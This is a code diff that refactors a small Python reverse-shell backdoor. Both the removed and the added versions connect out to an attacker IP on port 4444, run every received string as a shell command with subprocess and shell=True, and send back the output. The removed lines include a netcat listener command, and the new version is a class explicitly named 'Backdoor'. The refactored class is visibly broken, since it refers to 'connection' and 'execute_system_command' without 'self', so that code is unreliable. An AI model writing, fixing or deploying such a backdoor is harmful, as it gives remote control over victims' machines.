@@ -1,23 +1,28 @@
 import socket
 import subprocess
 
-# nc -vv -l -p 4444
 
-def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(('192.168.106.129', 4444))
-
-connection.send(b'\n[+] Connected!!!\n')
-
-while True:
-    command = connection.recv(1024).decode('utf-8')
+class Backdoor:
     
-    if command.lower() == 'exit':
-        break
-    
-    result = execute_system_command(command)
-    connection.send(result)
+    def __init__(self, attacker_ip, port):
+        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connection.connect((attacker_ip, port))
 
-connection.close()
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
+
+    def run(self):
+
+        while True:
+            command = connection.recv(1024).decode('utf-8')
+            
+            result = execute_system_command(command)
+            connection.send(result)
+
+        connection.close()
+
+attacker_ip = "192.168.106.129"
+
+bd = Backdoor(attacker_ip, 4444)
+bd.run()
